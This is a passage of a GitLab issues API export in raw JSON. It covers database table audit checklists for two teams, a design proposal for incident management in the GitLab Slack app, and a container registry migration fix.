seem accurate\n\n- [x] approval_project_rules_groups\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] approval_project_rules_groups description has been updated\n  - [x] approval_project_rules_groups `milestone` and `introduced_by_url` seem accurate\n\n- [x] x509_issuers\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] x509_issuers description has been updated\n  - [x] x509_issuers `milestone` and `introduced_by_url` seem accurate\n\n- [x] merge_request_context_commit_diff_files\n  - [ ] source_code_management is the correct feature category or has been updated\n  - [ ] merge_request_context_commit_diff_files description has been updated\n  - [ ] merge_request_context_commit_diff_files `milestone` and `introduced_by_url` seem accurate\n\n- [x] approval_merge_request_rules_users\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] approval_merge_request_rules_users description has been updated\n  - [x] approval_merge_request_rules_users `milestone` and `introduced_by_url` seem accurate\n\n- [x] gpg_keys\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] gpg_keys description has been updated\n  - [x] gpg_keys `milestone` and `introduced_by_url` seem accurate\n\n- [x] remote_mirrors\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] remote_mirrors description has been updated\n  - [x] remote_mirrors `milestone` and `introduced_by_url` seem accurate\n\n- [x] approval_merge_request_rules_groups\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] approval_merge_request_rules_groups description has been updated\n  - [x] approval_merge_request_rules_groups `milestone` and `introduced_by_url` seem accurate\n\n- [x] project_repository_states\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] project_repository_states description has been updated\n  - [x] project_repository_states `milestone` and `introduced_by_url` seem accurate\n\n- [x] approval_merge_request_rule_sources\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] approval_merge_request_rule_sources description has been updated\n  - [x] approval_merge_request_rule_sources `milestone` and `introduced_by_url` seem accurate\n\n- [x] x509_certificates\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] x509_certificates description has been updated\n  - [x] x509_certificates `milestone` and `introduced_by_url` seem accurate\n\n- [x] protected_tags\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] protected_tags description has been updated\n  - [x] protected_tags `milestone` and `introduced_by_url` seem accurate\n\n- [x] approvals\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] approvals description has been updated\n  - [x] approvals `milestone` and `introduced_by_url` seem accurate\n\n- [x] protected_branch_push_access_levels\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] protected_branch_push_access_levels description has been updated\n  - [x] protected_branch_push_access_levels `milestone` and `introduced_by_url` seem accurate\n\n- [x] lfs_objects_projects\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] lfs_objects_projects description has been updated\n  - [x] lfs_objects_projects `milestone` and `introduced_by_url` seem accurate\n\n- [x] external_approval_rules_protected_branches\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] external_approval_rules_protected_branches description has been updated\n  - [x] external_approval_rules_protected_branches `milestone` and `introduced_by_url` seem accurate\n\n- [x] merge_request_blocks\n  - [ ] source_code_management is the correct feature category or has been updated\n  - [ ] merge_request_blocks description has been updated\n  - [ ] merge_request_blocks `milestone` and `introduced_by_url` seem accurate\n\n- [x] x509_commit_signatures\n  - [ ] source_code_management is the correct feature category or has been updated\n  - [ ] x509_commit_signatures description has been updated\n  - [ ] x509_commit_signatures `milestone` and `introduced_by_url` seem accurate\n\n- [x] protected_branch_merge_access_levels\n  - [ ] source_code_management is the correct feature category or has been updated\n  - [ ] protected_branch_merge_access_levels description has been updated\n  - [ ] protected_branch_merge_access_levels `milestone` and `introduced_by_url` seem accurate\n\n- [x] protected_branch_unprotect_access_levels\n  - [ ] source_code_management is the correct feature category or has been updated\n  - [ ] protected_branch_unprotect_access_levels description has been updated\n  - [ ] protected_branch_unprotect_access_levels `milestone` and `introduced_by_url` seem accurate\n\n- [x] push_event_payloads\n  - [ ] source_code_management is the correct feature category or has been updated\n  - [ ] push_event_payloads description has been updated\n  - [ ] push_event_payloads `milestone` and `introduced_by_url` seem accurate\n\n- [x] draft_notes\n  - [ ] source_code_management is the correct feature category or has been updated\n  - [ ] draft_notes description has been updated\n  - [ ] draft_notes `milestone` and `introduced_by_url` seem accurate\n\n- [x] external_approval_rules\n  - [ ] source_code_management is the correct feature category or has been updated\n  - [ ] external_approval_rules description has been updated\n  - [ ] external_approval_rules `milestone` and `introduced_by_url` seem accurate\n\n- [x] protected_tag_create_access_levels\n  - [ ] source_code_management is the correct feature category or has been updated\n  - [ ] protected_tag_create_access_levels description has been updated\n  - [ ] protected_tag_create_access_levels `milestone` and `introduced_by_url` seem accurate\n\n- [x] approval_merge_request_rules\n  - [ ] source_code_management is the correct feature category or has been updated\n  - [ ] approval_merge_request_rules description has been updated\n  - [ ] approval_merge_request_rules `milestone` and `introduced_by_url` seem accurate\n\n- [x] approver_groups\n  - [ ] source_code_management is the correct feature category or has been updated\n  - [ ] approver_groups description has been updated\n  - [ ] approver_groups `milestone` and `introduced_by_url` seem accurate\n\n- [x] gpg_signatures\n  - [ ] source_code_management is the correct feature category or has been updated\n  - [ ] gpg_signatures description has been updated\n  - [ ] gpg_signatures `milestone` and `introduced_by_url` seem accurate\n\n- [x] repository_languages\n  - [ ] source_code_management is the correct feature category or has been updated\n  - [ ] repository_languages description has been updated\n  - [ ] repository_languages `milestone` and `introduced_by_url` seem accurate\n\n- [x] path_locks\n  - [ ] source_code_management is the correct feature category or has been updated\n  - [ ] path_locks description has been updated\n  - [ ] path_locks `milestone` and `introduced_by_url` seem accurate\n\n\n## Why is this effort happening?\n\nThere have been many times that issues occur in production, but the the infrastructure team doesn't have the information it needs\nto identify subject matter experts who can help resolve things quickly. This in turn can delay the time it takes\nto find and fix pressing issues.\n\n## How much time should we expect to spend on this?\n\nDepends, if the team has a lot of tables, it may take a little bit to get all of the information together.\nIf not, this could be _very_ fast. The descriptions are as much or little as the team wants to add. More\ninformation may help folks self service better.\n\n## How urgent is this?\n\nThe urgency is up to the team. If the tables have poor information or are misassigned, that may cause more\nburden on the team when answering questions.","state":"closed","created_at":"2022-04-15T21:17:19.276Z","updated_at":"2022-11-30T12:14:44.175Z","closed_at":"2022-10-26T17:45:16.277Z","closed_by":{"id":421631,"username":"vyaklushin","name":"Vasilii Iakliushin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/421631/avatar.png","web_url":"https://gitlab.com/vyaklushin"},"labels":["Category:Source Code Management","Deliverable","backend","devops::create","group::source code","maintenance::workflow","section::dev","type::maintenance","workflow::in review"],"milestone":{"id":2687593,"iid":81,"group_id":9970,"title":"15.6","description":"","state":"active","created_at":"2022-07-06T19:22:27.893Z","updated_at":"2022-07-06T19:22:27.893Z","due_date":"2022-11-17","start_date":"2022-10-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/81"},"assignees":[{"id":421631,"username":"vyaklushin","name":"Vasilii Iakliushin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/421631/avatar.png","web_url":"https://gitlab.com/vyaklushin"}],"author":{"id":480097,"username":"alexives","name":"Alex Ives","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/480097/avatar.png","web_url":"https://gitlab.com/alexives"},"type":"ISSUE","assignee":{"id":421631,"username":"vyaklushin","name":"Vasilii Iakliushin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/421631/avatar.png","web_url":"https://gitlab.com/vyaklushin"},"user_notes_count":10,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359333","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":192,"completed_count":150},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"150 of 192 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359333","notes":"https://gitlab.com/api/v4/projects/278964/issues/359333/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359333/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359333","relative":"#359333","full":"gitlab-org/gitlab#359333"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7842,"epic":{"id":492559,"iid":7842,"title":"Database Feature Category Audit","url":"/groups/gitlab-org/-/epics/7842","group_id":9970,"human_readable_end_date":"May 31, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106711103,"iid":359329,"project_id":278964,"title":"Database Dictionary Audit for Manage:Optimize","description":"Recently the database team has started documenting all database tables in `db/doc`. As an MVP, we've assigned\neach table to a feature category. We attempted to automate this, and then made rough guesses on the ones that\ncouldn't be automatically identified either using [this spreadsheet](https://docs.google.com/spreadsheets/d/1Rb4YgFz-2BP81v1efWxLn6TeKuf37SKvAdo91WQHqP0/edit#gid=0)\nor just by guessing based on their name and code references. In order to make sure these are accurate, I'm\nasking every team to take a look at the tables associated with their feature categories assoicated with their\nstages.\n\nWhat we need from your team? Look through the list of tables and fix any mistaken labels and update the description\nfield to help folks know what purpose the table serves.\n\n## Process (per table)\n\n1. Are the feature categories correct?\n   - Keep in mind that tables can have multiple categories. Look at [the list](https://about.gitlab.com/handbook/product/categories/#categories-a-z) and if there are any other categories it belongs to, add them.\n   - If a table has no category that seems to be a perfect match, assign it to the closest match. Tables _must_ have at least one feature category.\n   - If the table is assigned to a feature category for a different group, open a merge request changing the category and assign it to the EM for the group\n    responsible for that category.\n2. Update the description of the table to give anybody interacting with it context around the purpose and submit a merge request with the\n  information.\n3. Double check the `milestone` and `introduced_by_url` to see if they are accurate\n\n## Tables\n\n- [x] analytics_devops_adoption_segments\n  - [x] devops_reports is the correct feature category or has been updated\n  - [x] analytics_devops_adoption_segments description has been updated\n  - [x] analytics_devops_adoption_segments `milestone` and `introduced_by_url` seem accurate\n\n- [x] conversational_development_index_metrics\n  - [x] devops_reports is the correct feature category or has been updated\n  - [x] conversational_development_index_metrics description has been updated\n  - [x] conversational_development_index_metrics `milestone` and `introduced_by_url` seem accurate\n\n- [x] analytics_devops_adoption_snapshots\n  - [x] devops_reports is the correct feature category or has been updated\n  - [x] analytics_devops_adoption_snapshots description has been updated\n  - [x] analytics_devops_adoption_snapshots `milestone` and `introduced_by_url` seem accurate\n\n- [x] fork_networks\n  - [x] devops_reports is the correct feature category or has been updated\n  - [x] fork_networks description has been updated\n  - [x] fork_networks `milestone` and `introduced_by_url` seem accurate\n\n- [x] analytics_language_trend_repository_languages\n  - [x] devops_reports is the correct feature category or has been updated\n  - [x] analytics_language_trend_repository_languages description has been updated\n  - [x] analytics_language_trend_repository_languages `milestone` and `introduced_by_url` seem accurate\n\n- [x] analytics_usage_trends_measurements\n  - [x] devops_reports is the correct feature category or has been updated\n  - [x] analytics_usage_trends_measurements description has been updated\n  - [x] analytics_usage_trends_measurements `milestone` and `introduced_by_url` seem accurate\n\n- [x] analytics_cycle_analytics_issue_stage_events\n  - [x] value_stream_management is the correct feature category or has been updated\n  - [x] analytics_cycle_analytics_issue_stage_events description has been updated\n  - [x] analytics_cycle_analytics_issue_stage_events `milestone` and `introduced_by_url` seem accurate\n\n- [x] analytics_cycle_analytics_group_value_streams\n  - [x] value_stream_management is the correct feature category or has been updated\n  - [x] analytics_cycle_analytics_group_value_streams description has been updated\n  - [x] analytics_cycle_analytics_group_value_streams `milestone` and `introduced_by_url` seem accurate\n\n- [x] analytics_cycle_analytics_merge_request_stage_events\n  - [x] value_stream_management is the correct feature category or has been updated\n  - [x] analytics_cycle_analytics_merge_request_stage_events description has been updated\n  - [x] analytics_cycle_analytics_merge_request_stage_events `milestone` and `introduced_by_url` seem accurate\n\n- [x] merge_request_metrics\n  - [x] value_stream_management is the correct feature category or has been updated\n  - [x] merge_request_metrics description has been updated\n  - [x] merge_request_metrics `milestone` and `introduced_by_url` seem accurate\n\n- [x] analytics_cycle_analytics_project_stages\n  - [x] value_stream_management is the correct feature category or has been updated\n  - [x] analytics_cycle_analytics_project_stages description has been updated\n  - [x] analytics_cycle_analytics_project_stages `milestone` and `introduced_by_url` seem accurate\n\n- [x] insights\n  - [x] value_stream_management is the correct feature category or has been updated\n  - [x] insights description has been updated\n  - [x] insights `milestone` and `introduced_by_url` seem accurate\n\n- [x] analytics_cycle_analytics_group_stages\n  - [x] value_stream_management is the correct feature category or has been updated\n  - [x] analytics_cycle_analytics_group_stages description has been updated\n  - [x] analytics_cycle_analytics_group_stages `milestone` and `introduced_by_url` seem accurate\n\n- [x] dora_daily_metrics\n  - [x] value_stream_management is the correct feature category or has been updated\n  - [x] dora_daily_metrics description has been updated\n  - [x] dora_daily_metrics `milestone` and `introduced_by_url` seem accurate\n\n- [x] events\n  - [x] value_stream_management is the correct feature category or has been updated\n  - [x] events description has been updated\n  - [x] events `milestone` and `introduced_by_url` seem accurate\n\n- [x] analytics_cycle_analytics_stage_event_hashes\n  - [x] value_stream_management is the correct feature category or has been updated\n  - [x] analytics_cycle_analytics_stage_event_hashes description has been updated\n  - [x] analytics_cycle_analytics_stage_event_hashes `milestone` and `introduced_by_url` seem accurate\n\n- [x] analytics_cycle_analytics_aggregations\n  - [x] value_stream_management is the correct feature category or has been updated\n  - [x] analytics_cycle_analytics_aggregations description has been updated\n  - [x] analytics_cycle_analytics_aggregations `milestone` and `introduced_by_url` seem accurate\n\n- [x] issue_metrics\n  - [x] value_stream_management is the correct feature category or has been updated\n  - [x] issue_metrics description has been updated\n  - [x] issue_metrics `milestone` and `introduced_by_url` seem accurate\n\n\n## Why is this effort happening?\n\nThere have been many times that issues occur in production, but the the infrastructure team doesn't have the information it needs\nto identify subject matter experts who can help resolve things quickly. This in turn can delay the time it takes\nto find and fix pressing issues.\n\n## How much time should we expect to spend on this?\n\nDepends, if the team has a lot of tables, it may take a little bit to get all of the information together.\nIf not, this could be _very_ fast. The descriptions are as much or little as the team wants to add. More\ninformation may help folks self service better.\n\n## How urgent is this?\n\nThe urgency is up to the team. If the tables have poor information or are misassigned, that may cause more\nburden on the team when answering questions.","state":"closed","created_at":"2022-04-15T21:17:13.993Z","updated_at":"2022-09-21T12:02:50.863Z","closed_at":"2022-09-02T05:32:43.170Z","closed_by":{"id":4156052,"username":"ahegyi","name":"Adam Hegyi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ff7cdaff6b98fba9b977f1885578b8b3?s=80\u0026d=identicon","web_url":"https://gitlab.com/ahegyi"},"labels":["Category:Database","Database tooling","Deliverable","backend","devops::manage","documentation","group::optimize","priority::3","section::dev","type::maintenance","workflow::production"],"milestone":{"id":2453026,"iid":76,"group_id":9970,"title":"15.4","description":"[GitLab 15.4 Release](https://gitlab.com/gitlab-org/gitlab/-/releases/v15.4.0-ee)","state":"active","created_at":"2022-02-03T22:29:22.015Z","updated_at":"2022-09-29T02:21:26.561Z","due_date":"2022-09-17","start_date":"2022-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/76"},"assignees":[{"id":4156052,"username":"ahegyi","name":"Adam Hegyi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ff7cdaff6b98fba9b977f1885578b8b3?s=80\u0026d=identicon","web_url":"https://gitlab.com/ahegyi"}],"author":{"id":480097,"username":"alexives","name":"Alex Ives","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/480097/avatar.png","web_url":"https://gitlab.com/alexives"},"type":"ISSUE","assignee":{"id":4156052,"username":"ahegyi","name":"Adam Hegyi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ff7cdaff6b98fba9b977f1885578b8b3?s=80\u0026d=identicon","web_url":"https://gitlab.com/ahegyi"},"user_notes_count":7,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359329","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":72,"completed_count":72},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"72 of 72 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359329","notes":"https://gitlab.com/api/v4/projects/278964/issues/359329/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359329/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359329","relative":"#359329","full":"gitlab-org/gitlab#359329"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7842,"epic":{"id":492559,"iid":7842,"title":"Database Feature Category Audit","url":"/groups/gitlab-org/-/epics/7842","group_id":9970,"human_readable_end_date":"May 31, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106710783,"iid":359322,"project_id":278964,"title":"Design: Introduce incident management workflow to GitLab Slack App","description":"\u003c!-- This issue template can be used as a great starting point for feature requests. The section \"Release notes\" can be used as a summary of the feature and is also required if you want to have your release post blog MR auto generated using the release post item generator:  https://about.gitlab.com/handbook/marketing/blog/release-posts/#release-post-item-generator. The remaining sections are the backbone for every feature in GitLab.\n\nThe goal of this template is brevity for quick/smaller iterations. For a more thorough list of considerations for larger features or feature sets, you can leverage the detailed [feature proposal](https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab/issue_templates/Feature%20proposal%20-%20detailed.md). --\u003e\n\n### Release notes\n\n\u003c!-- What is the problem and solution you're proposing? This content sets the overall vision for the feature and serves as the release notes that will populate in various places, including the [release post blog](https://about.gitlab.com/releases/categories/releases/) and [Gitlab project releases](https://gitlab.com/gitlab-org/gitlab/-/releases). \" --\u003e\n\n### Background\n\n\u003c!-- What is the user problem you are trying to solve with this issue? --\u003e\n\nIn https://gitlab.com/gitlab-org/gitlab/-/issues/364422+, we investigated some initial ideas for porting over some of the existing Woodhouse Slack app functionality into the newly updated GitLab Slack App. The goal of this would be to enable a more robust Slack-to-GitLab integration for incident responders.\n\nAs part of this work, we plan to introduce the following:\n\n1. A place to define Slack notification settings for incidents\n1. A way to declare an incident from Slack, and include options to \n   * Add relevant information to the incident from Slack at the time of incident creation (following Woodhouse).\n   * Add appropriate additional resources to the incident at the time of incident creation (zoom link, create new Slack channel, again following Woodhouse).\n   * Post a notification of incident creation in the appropriate Slack channel, with links to the relevant resources (following Woodhouse).\n   * Post relevant resources that have been added to the incident issue (following Woodhouse).\n1. A way to keep content synced up between Slack and GitLab\n\nOur goal would be to build on the improved GitLab Slack app the Ecosystem is building. However, if the [notifications haven't yet been ported](https://gitlab.com/gitlab-org/gitlab/-/issues/335673) over to the GitLab Slack app yet, we may need to build on the current GitLab Slack notification integration. More details in [this thread](https://gitlab.com/gitlab-org/gitlab/-/issues/364422#note_1001577223).\n\n### Proposal\n\n\u003c!-- Use this section to explain the feature and how it will work. It can be helpful to add technical details, design proposals, and links to related epics or issues. --\u003e\n\nAs part of the discovery issue, we created rough sketches for how introducing these features could look:\n\n| Create a space to define incident notification settings | Allow people to create an incident from Slack | Allow for adding data to incidents at the time of incident creation | Post a notification linking to relevant resources in Slack when an incident has been created | Add relevant details from Slack directly to the incident | Find a way to send updates to Slack from GitLab | Refine process for adding Slack comments to incidents | Introduce a way to add items to the timeline from Slack |\n| ------ | ------ | ------ | ------ | ------ | ------ | ------ | ------ |\n| ![Settings_page](/uploads/3645d98c94c32dcfa36235251ff06ad5/Settings_page.png) |![Slack](/uploads/70a321a07d4e393e65f729282d38e231/Slack.png) | ![Slack-4](/uploads/e2388bd3b66ed73e41d389e52d01cc06/Slack-4.png) | ![Slack-1](/uploads/8ef2aec0a6ee7d009da0160ab372449d/Slack-1.png) | ![Incident](/uploads/a512ca3d575918a9feed17e232bb7c49/Incident.png) | ![Incident-1](/uploads/408a9c0209c1256206df5cd5a184522d/Incident-1.png) | ![Slack-2](/uploads/3312ccfd32efd90a889637599f382dc9/Slack-2.png) | ![Slack-3](/uploads/7e56908d9766918f0c757e422df87232/Slack-3.png)  |\n\nThe goal of this issue, though, is to more fully flesh out these designs, and break down this work into implementation issues. \n\n**WIP Designs**\n\n| Introduce incident-specific item to notification settings | New slash command for creating an incident | Slack modal for adding context to incident at the time of incident creation | New incident notification | Incident automatically populated with the content added from Slack | Allow people to send specific comments to Slack from GitLab | Make commenting on incidents from Slack easier | Allow people to add to the timeline from Slack |\n| ------ | ------ | ------ | ------ | ------ | ------ | ------ | ------ |\n| ![Settings_updates__1_](/uploads/d130aab8d253b0debf188b6a56d6e98e/Settings_updates__1_.png) | ![New_slash_command](/uploads/343444c827b5c512cbde5794a510b94d/New_slash_command.png) | ![Modal](/uploads/a3c6c03a6cee358c83d52ef534e3755d/Modal.png)|![New_incident_notification](/uploads/ea23a1174fef44ea41f7160482c4488a/New_incident_notification.png) | ![Auto-populated_incident](/uploads/65501a38a44aee8e71b1fbca09eddc0b/Auto-populated_incident.png)  | ![GitLab_slash_command](/uploads/36dbab2e2d854cf3a191710e1db0e1cf/GitLab_slash_command.png) | ![Making_commenting_on_incidents_easier](/uploads/d6e0f8acb2512fcaa301fee5dc7d1464/Making_commenting_on_incidents_easier.png)) |![Integrate_Slack_with_the_timeline](/uploads/86158772e22c95f794988ebecbdfe96e/Integrate_Slack_with_the_timeline.png) |\n\n[Clickable prototype](https://www.figma.com/proto/yhZmsrVMFJUC390YOKWqUT/Slack-integration-for-incidents-gitlab-com%26364422?node-id=1385%3A36164\u0026scaling=scale-down\u0026page-id=559%3A5185\u0026starting-point-node-id=1385%3A36164)\n\n[Figma file](https://www.figma.com/file/yhZmsrVMFJUC390YOKWqUT/Slack-integration-for-incidents-gitlab-com%26364422?node-id=1359%3A32642)\n\n[Slack Block Kit Builder](https://app.slack.com/block-kit-builder/)\n\n### Intended users\n\n\u003c!-- Who will use this feature? If known, include any of the following: types of users (e.g. Developer), personas, or specific company roles (e.g. Release Manager). It's okay to write \"Unknown\" and fill this field in later.\n\nPersonas are described at https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/\n\n* [Cameron (Compliance Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#cameron-compliance-manager)\n* [Parker (Product Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#parker-product-manager)\n* [Delaney (Development Team Lead)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#delaney-development-team-lead)\n* [Presley (Product Designer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#presley-product-designer)\n* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)\n* [Priyanka (Platform Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#priyanka-platform-engineer)\n* [Sidney (Systems Administrator)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sidney-systems-administrator)\n* [Sam (Security Analyst)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sam-security-analyst)\n* [Rachel (Release Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#rachel-release-manager)\n* [Alex (Security Operations Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#alex-security-operations-engineer)\n* [Simone (Software Engineer in Test)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#simone-software-engineer-in-test)\n* [Allison (Application Ops)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#allison-application-ops)\n* [Ingrid (Infrastructure Operator)](https://about.gitlab.com/handbook/product/personas/#ingrid-infrastructure-operator)\n* [Dakota (Application Development Director)](https://about.gitlab.com/handbook/product/personas/#dakota-application-development-director)\n* [Dana (Data Analyst)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#dana-data-analyst)\n* [Eddie (Content Editor)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#eddie-content-editor)\n--\u003e\n\n### Feature Usage Metrics\n\n\u003c!-- How are you going to track usage of this feature? Think about user behavior and their interaction with the product. What indicates someone is getting value from it?\n\nCreate tracking issue using the Snowplow event tracking template. See https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab/issue_templates/Snowplow%20event%20tracking.md\n\n--\u003e\n\n\u003c!-- Label reminders\nUse the following resources to find the appropriate labels:\n- https://gitlab.com/gitlab-org/gitlab/-/labels\n- https://about.gitlab.com/handbook/product/categories/features/\n--\u003e\n\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e\n*This page may contain information related to upcoming products, features and functionality.\nIt is important to note that the information presented is for informational purposes only, so please do not rely on the information for purchasing or planning purposes.\nJust like with all projects, the items mentioned on the page are subject to change or delay, and the development, release, and timing of any products, features, or functionality remain at the sole discretion of GitLab Inc.*\n\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e","state":"closed","created_at":"2022-04-15T21:02:25.325Z","updated_at":"2022-08-09T18:57:24.536Z","closed_at":"2022-08-09T18:57:24.223Z","closed_by":{"id":2799498,"username":"ameliabauerly","name":"Amelia Bauerly","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2799498/avatar.png","web_url":"https://gitlab.com/ameliabauerly"},"labels":["Category:Incident Management","UX","devops::monitor","feature::addition","group::respond","section::ops","type::feature","workflow::design"],"milestone":{"id":2453025,"iid":75,"group_id":9970,"title":"15.3","description":"","state":"active","created_at":"2022-02-03T22:28:50.229Z","updated_at":"2022-02-03T22:28:50.229Z","due_date":"2022-08-17","start_date":"2022-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/75"},"assignees":[{"id":2799498,"username":"ameliabauerly","name":"Amelia Bauerly","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2799498/avatar.png","web_url":"https://gitlab.com/ameliabauerly"}],"author":{"id":2799498,"username":"ameliabauerly","name":"Amelia Bauerly","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2799498/avatar.png","web_url":"https://gitlab.com/ameliabauerly"},"type":"ISSUE","assignee":{"id":2799498,"username":"ameliabauerly","name":"Amelia Bauerly","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2799498/avatar.png","web_url":"https://gitlab.com/ameliabauerly"},"user_notes_count":21,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359322","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":8,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359322","notes":"https://gitlab.com/api/v4/projects/278964/issues/359322/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359322/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359322","relative":"#359322","full":"gitlab-org/gitlab#359322"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106706838,"iid":359300,"project_id":278964,"title":"Update registry migration guard logic","description":"## Problem\n\nIn the production rollout, we hit the scenario where a pre-import got stuck. After 30 minutes it canceled and skipped as expected. This brought on a few questions:\n\n1. Do we want to skip in this case or retry a few more times?\n2. When we have a canceled migration, how can we tell if rails canceled it or the registry canceled it\n3. We probably don't need to wait 30 minutes.\n4. We should be re-enqueueing after a container repository is skipped to keep the migration running.\n\n## Solution\n\nTo address these questions we will:\n\n1. Re-enqueue after a container repository is skipped.\n2. Add a new skipped state: `migration_canceled_registry`. This will only be used if the cancelation is coming from the registry side\n3. Update the `long_running_migration_threshold` to 10 minutes\n4. If an import or preimport is canceled by rails, allow it to retry until it hits the max retries. In this case, we need to cancel from rails before retrying, so some logic updates will be needed in the state machine.\n5. Add a capacity feature flag of 2 so we have less of jump from 1 to 10.","state":"closed","created_at":"2022-04-15T17:57:13.232Z","updated_at":"2022-04-27T22:33:53.321Z","closed_at":"2022-04-25T14:35:09.382Z","closed_by":{"id":4059254,"username":"sabrams","name":"Steve Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"},"labels":["Category:Container Registry","Container Registry Migration","Container Registry Migration Unplanned","Container Registry Migration::Phase 2","auto updated","backend","devops::package","feature::enhancement","group::package registry","ruby","section::ops","type::feature","workflow::verification"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":4059254,"username":"sabrams","name":"Steve Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"}],"author":{"id":4059254,"username":"sabrams","name":"Steve Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"},"type":"ISSUE","assignee":{"id":4059254,"username":"sabrams","name":"Steve 